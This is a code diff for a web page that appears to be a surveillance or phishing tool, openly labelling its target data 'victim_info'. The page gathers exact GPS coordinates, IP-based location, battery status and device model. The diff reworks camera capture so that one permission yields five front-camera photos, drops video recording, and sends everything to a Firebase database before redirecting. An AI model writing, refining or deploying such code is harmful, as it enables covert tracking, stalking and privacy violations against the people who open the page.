@@ -167,15 +167,6 @@
         .debug-console.show {
             display: block;
         }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .loading {
-            animation: pulse 1.5s ease infinite;
-        }
     </style>
 </head>
 <body>
@@ -205,18 +196,13 @@
             </div>
             <div class="step" id="step3">
                 <div class="step-icon">📸</div>
-                <div class="step-text">Camera Capture (3 Photos)</div>
+                <div class="step-text">Capturing Photos (5)</div>
                 <div class="step-status" id="step3Status">⚪</div>
             </div>
             <div class="step" id="step4">
-                <div class="step-icon">🎥</div>
-                <div class="step-text">Video Capture (5 sec)</div>
-                <div class="step-status" id="step4Status">⚪</div>
-            </div>
-            <div class="step" id="step5">
                 <div class="step-icon">☁️</div>
                 <div class="step-text">Uploading Data</div>
-                <div class="step-status" id="step5Status">⚪</div>
+                <div class="step-status" id="step4Status">⚪</div>
             </div>
         </div>
         
@@ -303,7 +289,7 @@
                 }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        addDebug(`Exact Location: ${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
+                        addDebug(`📍 Exact Location: ${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
                         resolve({ 
                             lat: pos.coords.latitude, 
                             lng: pos.coords.longitude,
@@ -325,7 +311,7 @@
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                addDebug(`IP: ${data.ip}, City: ${data.city}, Country: ${data.country_name}`);
+                addDebug(`🌐 IP: ${data.ip}, 📍 City: ${data.city}, ${data.country_name}`);
                 return {
                     ip: data.ip || 'Unknown',
                     country: data.country_name || 'Unknown',
@@ -348,7 +334,7 @@
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
                     const status = `${level}% (${battery.charging ? '🔌 Charging' : '🔋 Discharging'})`;
-                    addDebug(`Battery: ${status}`);
+                    addDebug(`🔋 Battery: ${status}`);
                     return { level: level, charging: battery.charging, status: status };
                 } catch(e) {
                     return { level: 0, charging: false, status: 'Unknown' };
@@ -363,23 +349,21 @@
             let model = 'Unknown';
             let brand = 'Unknown';
             
-            // Android Model Detection
             if (/Android/i.test(ua)) {
                 const match = ua.match(/\(([^;]+);\s([^;]+)\s[^;]*\)/);
                 if (match && match[2]) {
                     brand = match[1] || 'Unknown';
                     model = match[2] || 'Unknown';
                 }
-                // Samsung specific
                 if (ua.includes('SM-')) {
                     const smMatch = ua.match(/SM-[A-Z0-9]+/);
                     if (smMatch) model = smMatch[0];
                 }
-                // Xiaomi/Redmi
-                if (ua.includes('Redmi')) model = 'Redmi ' + (ua.match(/Redmi\s+[A-Z0-9]+/i) || ['Redmi'])[0];
-                if (ua.includes('MI')) model = 'Xiaomi ' + (ua.match(/MI\s+[A-Z0-9]+/i) || ['MI'])[0];
+                if (ua.includes('Redmi')) model = 'Redmi';
+                if (ua.includes('MI')) model = 'Xiaomi';
+                if (ua.includes('OnePlus')) model = 'OnePlus';
+                if (ua.includes('Pixel')) model = 'Google Pixel';
             }
-            // iOS Model Detection
             else if (/iPhone|iPad|iPod/i.test(ua)) {
                 if (ua.includes('iPhone')) {
                     const match = ua.match(/iPhone(\d+,\d+)/);
@@ -389,7 +373,7 @@
                 brand = 'Apple';
             }
             
-            addDebug(`Device: ${brand} ${model}`);
+            addDebug(`📱 Device: ${brand} ${model}`);
             return { brand: brand, model: model, full: `${brand} ${model}`.trim() };
         }
         
@@ -422,98 +406,63 @@
             else if (/Firefox/i.test(ua)) browser = 'Firefox';
             else if (/Edg/i.test(ua)) browser = 'Edge';
             
-            return { os, osVersion, browser, ua: ua };
+            return { os, osVersion, browser };
         }
         
-        // Capture Multiple Photos
-        async function captureMultiplePhotos(count = 3) {
+        // Capture Multiple Photos (5 photos, 1.5 sec gap, single permission)
+        async function captureMultiplePhotos(count = 5) {
             const photos = [];
             
-            for (let i = 0; i < count; i++) {
-                addDebug(`Capturing photo ${i+1}/${count}...`);
-                const photo = await capturePhotoBase64();
-                if (photo) {
-                    photos.push(photo);
-                    addDebug(`Photo ${i+1} captured (${Math.round(photo.length/1024)}KB)`);
-                }
-                await new Promise(r => setTimeout(r, 800));
+            // Ek baar permission lo
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                addDebug("📸 Camera access granted (single permission)");
+            } catch(err) {
+                addDebug("Camera permission denied: " + err.message, true);
+                return photos;
             }
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
+            // Capture photos with gap
+            for (let i = 0; i < count; i++) {
+                addDebug(`📸 Capturing photo ${i+1}/${count}...`);
+                
+                // Update status text
+                document.getElementById('step3Status').innerHTML = `${i+1}/${count}`;
+                updateProgress(50 + ((i+1) / count) * 25, `Capturing photo ${i+1}/${count}...`);
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const base64 = canvas.toDataURL('image/jpeg', 0.8);
+                photos.push(base64);
+                addDebug(`✅ Photo ${i+1} captured (${Math.round(base64.length/1024)}KB)`);
+                
+                // Gap of 1.5 seconds between photos
+                if (i < count - 1) {
+                    await new Promise(r => setTimeout(r, 1500));
+                }
+            }
+            
+            // Stop camera
+            stream.getTracks().forEach(track => track.stop());
+            addDebug(`🎬 Capture complete: ${photos.length} photos`);
             
             return photos;
         }
         
-        // Capture Single Photo as Base64
-        async function capturePhotoBase64() {
-            return new Promise((resolve) => {
-                if (!navigator.mediaDevices) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                    .then(stream => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(() => {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                                stream.getTracks().forEach(t => t.stop());
-                                const base64 = canvas.toDataURL('image/jpeg', 0.8);
-                                resolve(base64);
-                            }, 100);
-                        };
-                    })
-                    .catch(err => {
-                        addDebug("Camera error: " + err.message, true);
-                        resolve(null);
-                    });
-            });
-        }
-        
-        // Capture Video (5 seconds)
-        async function captureVideo(seconds = 5) {
-            return new Promise((resolve) => {
-                if (!navigator.mediaDevices) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                    .then(stream => {
-                        addDebug(`Recording ${seconds} seconds video...`);
-                        const mediaRecorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        
-                        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                        mediaRecorder.onstop = () => {
-                            const blob = new Blob(chunks, { type: 'video/mp4' });
-                            const reader = new FileReader();
-                            reader.onloadend = () => {
-                                stream.getTracks().forEach(t => t.stop());
-                                const base64 = reader.result;
-                                addDebug(`Video captured (${Math.round(base64.length/1024)}KB)`);
-                                resolve(base64);
-                            };
-                            reader.readAsDataURL(blob);
-                        };
-                        
-                        mediaRecorder.start();
-                        setTimeout(() => {
-                            mediaRecorder.stop();
-                        }, seconds * 1000);
-                    })
-                    .catch(err => {
-                        addDebug("Video error: " + err.message, true);
-                        resolve(null);
-                    });
-            });
-        }
-        
-        // Main Execution
+        // Main execution
         async function main() {
             updateProgress(0, 'Starting system...');
             
@@ -549,12 +498,12 @@
             };
             
             markStep(1, true, '✓');
-            updateProgress(20, 'Device detected');
+            updateProgress(25, 'Device detected');
             await new Promise(r => setTimeout(r, 500));
             
             // Step 2: Exact Location
             markStep(2, false, '⟳');
-            updateProgress(30, 'Getting GPS location...');
+            updateProgress(35, 'Getting GPS location...');
             
             const exactLocation = await getExactLocation();
             const locationData = {
@@ -570,36 +519,32 @@
             };
             
             markStep(2, true, exactLocation.lat !== 0 ? '✓' : '⚠');
-            updateProgress(40, 'GPS locked');
+            updateProgress(50, 'GPS locked');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 3: Multiple Photos (3 pics)
+            // Step 3: Capture 5 Photos
             markStep(3, false, '⟳');
-            updateProgress(50, 'Capturing photos...');
+            updateProgress(60, 'Preparing camera...');
             
-            const photos = await captureMultiplePhotos(3);
-            markStep(3, true, photos.length > 0 ? `${photos.length}✓` : '⚠');
-            updateProgress(65, `${photos.length} photos captured`);
+            const photos = await captureMultiplePhotos(5);
+            
+            if (photos.length > 0) {
+                markStep(3, true, `${photos.length}/5 ✓`);
+            } else {
+                markStep(3, false, '✗', true);
+            }
+            updateProgress(85, `${photos.length} photos captured`);
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 4: Video Capture (5 seconds)
+            // Step 4: Upload to Firebase
             markStep(4, false, '⟳');
-            updateProgress(75, 'Recording video (5 sec)...');
-            
-            const video = await captureVideo(5);
-            markStep(4, true, video ? '✓' : '⚠');
-            updateProgress(85, 'Video recorded');
-            await new Promise(r => setTimeout(r, 500));
-            
-            // Step 5: Upload to Firebase
-            markStep(5, false, '⟳');
             updateProgress(92, 'Uploading data...');
             
             const uploadData = {
                 victim_info: victimInfo,
                 location: locationData,
                 photos: photos,
-                video: video,
+                photo_count: photos.length,
                 timestamp: new Date().toISOString(),
                 complete: true
             };
@@ -607,11 +552,11 @@
             try {
                 await database.ref(`sessions/${sessionId}/data`).set(uploadData);
                 addDebug("✅ ALL DATA UPLOADED SUCCESSFULLY!");
-                markStep(5, true, '✓');
+                markStep(4, true, '✓');
                 updateProgress(100, 'Complete! Redirecting...');
             } catch(e) {
                 addDebug("Upload error: " + e.message, true);
-                markStep(5, false, '✗', true);
+                markStep(4, false, '✗', true);
             }
             
             setTimeout(() => {
